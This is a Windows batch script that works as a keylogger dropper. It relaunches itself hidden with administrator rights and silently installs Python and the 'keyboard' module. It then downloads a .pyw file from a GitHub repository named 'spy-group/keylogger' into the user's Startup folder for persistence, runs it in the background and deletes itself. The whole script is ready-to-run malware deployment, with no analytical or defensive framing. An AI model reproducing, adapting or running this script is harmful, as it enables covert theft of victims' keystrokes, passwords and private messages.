@echo off
REM Hide the command prompt window
if "%1" == "" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -Verb RunAs"
    exit /b
)

REM Check if Python is installed
where python >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python...
    REM Download and install Python silently
    curl -o "%TEMP%\python_installer.exe" https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
    start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1
    del "%TEMP%\python_installer.exe"
)

REM Install the 'keyboard' module using pip
echo Installing 'keyboard' module...
python -m pip install keyboard --quiet

REM Download the Python script from GitHub
echo Downloading Python script...
curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw" https://raw.githubusercontent.com/spy-group/keylogger/main/Lecture.pyw

REM Run the Python script in the background
echo Running Python script...
start "" pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"

REM Delete the batch file itself
del "%~f0"